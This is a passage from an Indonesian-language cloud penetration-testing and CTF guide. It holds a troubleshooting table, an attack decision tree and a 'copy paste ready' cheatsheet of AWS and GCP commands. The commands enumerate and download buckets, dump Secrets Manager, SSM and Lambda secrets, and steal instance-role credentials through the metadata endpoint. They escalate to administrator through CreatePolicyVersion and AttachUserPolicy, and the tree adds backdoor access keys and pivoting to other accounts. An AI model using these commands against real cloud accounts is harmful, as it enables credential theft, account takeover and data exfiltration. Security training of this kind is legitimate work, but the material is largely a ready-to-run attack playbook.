    print(f'[-] {data[\"error\"][\"message\"]}')
"

# Method 2: Dengan gcloud credentials
gcloud auth activate-service-account --key-file=credentials.json 2>/dev/null
gcloud storage ls 2>/dev/null
gcloud storage ls "gs://$BUCKET_NAME" 2>/dev/null
gcloud storage cp -r "gs://$BUCKET_NAME" ~/cloud_loot/gcs/ 2>/dev/null
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`InvalidClientTokenId`|Access Key ID salah/tidak aktif|Cek format AKIA vs ASIA, periksa copy-paste|
|`ExpiredTokenException`|Session token kadaluarsa|Ambil token baru dari IMDS atau STS|
|`AccessDenied`|Permission tidak ada|Jalankan enumerate-iam untuk cari permission lain|
|`The security token included is invalid`|Lupa set `AWS_SESSION_TOKEN`|Export ketiga variabel: KEY + SECRET + TOKEN|
|`PermanentRedirect`|Bucket di region lain|Tambah `--region eu-west-1` ke command|
|`NoCredentialProviders`|Tidak ada credentials dikonfigurasi|`aws configure` atau set env vars|
|`ThrottlingException`|Terlalu banyak API call|Tambah `--page-size 10` atau sleep antar request|
|`403 Forbidden` di S3|Bucket private|Coba dengan credentials, atau cari file spesifik langsung|
|`404 pada bucket`|Bucket tidak exist di region ini|Coba `--region us-east-1`, `eu-west-1`, dll|
|`MFA required`|Policy wajib MFA|`aws sts get-session-token --serial-number <ARN_MFA> --token-code <CODE>`|
|`RequestExpired`|Clock skew (jam tidak sinkron)|`sudo ntpdate pool.ntp.org`|
|enumerate-iam lambat|7000+ API calls sequential|Pakai Pacu: `run iam__enum_permissions`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Target Cloud Ditemukan
│
├─ FASE 0: Identifikasi Provider
│   ├─ HTTP Headers/DNS → AWS/Azure/GCP
│   └─ TruffleHog GitHub → [KREDENSIAL BOCOR?]
│       └─ YA → Langsung FASE 2
│
├─ FASE 1: Storage Tanpa Credentials
│   ├─ Brute force S3 nama bucket
│   │   ├─ [200 Publik] → List & Download → Analisis
│   │   │   ├─ [Credentials ditemukan] → FASE 2
│   │   │   └─ [Flag CTF] → SELESAI
│   │   └─ [403 Private] → Catat, lanjut FASE 2
│   └─ [Tidak ada] → Cari Azure/GCP
│
├─ FASE 2: Credential Validation
│   ├─ aws sts get-caller-identity
│   │   ├─ [IAM User] → Enumerate permissions
│   │   └─ [IAM Role] → Cek scope permission role
│   └─ Permissions terbatas → enumerate-iam atau Pacu
│
├─ FASE 3: Resource Enumeration
│   ├─ S3: List + Sync semua bucket accessible
│   ├─ EC2: Instance list + User Data (credentials!)
│   ├─ Lambda: Environment Variables (credentials!)
│   └─ Secrets Manager + SSM: Dump semua secrets
│
├─ FASE 4: IMDS (Jika ada SSRF atau shell EC2)
│   ├─ IMDSv1: curl langsung → dump credentials
│   └─ IMDSv2: PUT token dulu → gunakan token → dump
│
├─ FASE 5: Privilege Escalation
│   ├─ CreatePolicyVersion → buat policy admin baru
│   ├─ AttachUserPolicy → attach AdministratorAccess
│   └─ PassRole + Lambda → eksekusi sebagai admin role
│
└─ FASE 6: Post-Exploitation
    ├─ RDS Snapshots publik → restore di akun sendiri
    ├─ AssumeRole → pivot ke akun AWS lain
    └─ Buat backdoor access key (untuk report)
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET_DOMAIN="megacorp.com"
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"
# Jika temporary credentials (ASIA...):
# export AWS_SESSION_TOKEN="AQoDYXdzEJr1..."
mkdir -p ~/cloud_loot/{s3,iam,creds,keys,secrets,ec2}

# === IDENTITY ===
aws sts get-caller-identity                                    # Siapa kita?
aws iam list-attached-user-policies --user-name USERNAME       # Policies user
aws iam list-roles --output table                              # List semua roles

# === S3 TANPA CREDENTIALS ===
aws s3 ls s3://BUCKET_NAME --no-sign-request                   # List publik
aws s3 sync s3://BUCKET_NAME ./loot/ --no-sign-request         # Download semua
aws s3 ls s3://BUCKET_NAME --recursive --no-sign-request | \
    grep -iE "flag|password|\.env|\.sql|secret"                # Filter sensitif

# === S3 DENGAN CREDENTIALS ===
aws s3 ls                                                      # List semua bucket
aws s3 sync s3://BUCKET_NAME ./loot/                           # Download bucket

# === EC2 ===
aws ec2 describe-instances --output table                      # List instances
aws ec2 describe-instance-attribute \
    --instance-id INSTANCE_ID \
    --attribute userData \
    --query 'UserData.Value' --output text | base64 -d         # User data

# === LAMBDA SECRETS ===
aws lambda list-functions --output json | \
    python3 -c "import json,sys; [print(f['FunctionName'],
    f.get('Environment',{}).get('Variables',{}))
    for f in json.load(sys.stdin)['Functions']]"

# === SECRETS MANAGER ===
aws secretsmanager list-secrets --output table                 # List secrets
aws secretsmanager get-secret-value \
    --secret-id SECRET_NAME \
    --query 'SecretString' --output text                       # Baca secret
aws ssm get-parameters-by-path --path "/" \
    --recursive --with-decryption                              # SSM params

# === IMDS (dari dalam EC2) ===
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# IMDSv2:
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# === PRIVILEGE ESCALATION ===
# Path A: CreatePolicyVersion
aws iam create-policy-version \
    --policy-arn POLICY_ARN \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
    --set-as-default

# Path B: AttachUserPolicy
aws iam attach-user-policy \
    --user-name USERNAME \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# === AUTOMATED TOOLS ===
python3 /opt/enumerate-iam/enumerate-iam.py \
    --access-key $AWS_ACCESS_KEY_ID \
    --secret-key $AWS_SECRET_ACCESS_KEY    # Brute force permissions
scout aws --profile default               # Multi-cloud audit visual
prowler aws                               # Security assessment
cloudfox aws all-checks                   # Fast attack surface discovery
trufflehog s3 --bucket=BUCKET_NAME       # Secret scanner di S3
trufflehog git https://github.com/ORG/REPO  # Secret scanner di GitHub
```

---

> **➡️ NEXT:** Setelah enumeration selesai dan dapat credentials/akses, lanjut ke **`[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)`** untuk eksploitasi mendalam, privilege escalation lanjutan, dan persistence di infrastruktur AWS.
> 
> **➡️ PREV:** Jika memory dump dari cloud VM ditemukan, ke **`[🧠 Bagian 0: Fondasi Memory Forensics](/docs/memory-forensics)`** untuk analisis Volatility.